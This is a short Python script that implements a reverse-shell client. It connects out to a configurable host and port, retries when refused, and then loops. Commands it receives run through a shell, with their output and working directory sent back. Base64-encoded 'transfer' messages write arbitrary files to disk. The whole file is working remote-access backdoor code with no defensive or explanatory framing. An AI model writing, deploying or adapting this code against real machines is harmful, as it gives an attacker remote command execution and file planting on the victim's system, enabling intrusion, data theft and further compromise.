import base64
import binascii
from datetime import datetime
import socket
import subprocess
import os


class SocketConnection:
    socket = None

    def __init__(self, ip='127.0.0.1', port=4001):
        self.ip = ip
        self.port = port

    def create_a_socket(self):
        self.socket = socket.socket()
        self.connect_ip_to_port()

    def connect_ip_to_port(self):
        try:
            self.socket.connect((self.ip, self.port))
        except ConnectionRefusedError:
            con = SocketConnection()
            con.create_a_socket()

        self.manage_connection()

    def receive_files(self, data):
        date = datetime.now().strftime('%d-%m-%y-')
        data = base64.b64decode(data).replace(str.encode('transfer'), str.encode(''))

        with open(str.encode(date) + data[:2].lower() + data[-4:], 'wb') as f:
            try:
                f.write(base64.b64decode(data[2:-4]))
            except binascii.Error:
                f.write(str.encode(data[2:-4].decode('utf-8')))
        self.socket.send(str.encode('sent successfully'))

    def manage_connection(self):
        while True:
            data = self.socket.recv(20480)
            try:
                if str.encode('transfer') in base64.b64decode(data):
                    self.receive_files(data)
            except binascii.Error:
                self.shell_terminal(data)

            else:
                self.shell_terminal(data)

    def shell_terminal(self, data):
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            command = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = command.stdout.read() + command.stderr.read()
            output = str(output_byte.decode("utf-8", "ignore"))
            current_directory = os.getcwd() + "$"
            self.socket.send(str.encode(output + current_directory))


if __name__ == '__main__':
    conn = SocketConnection()
    conn.create_a_socket()
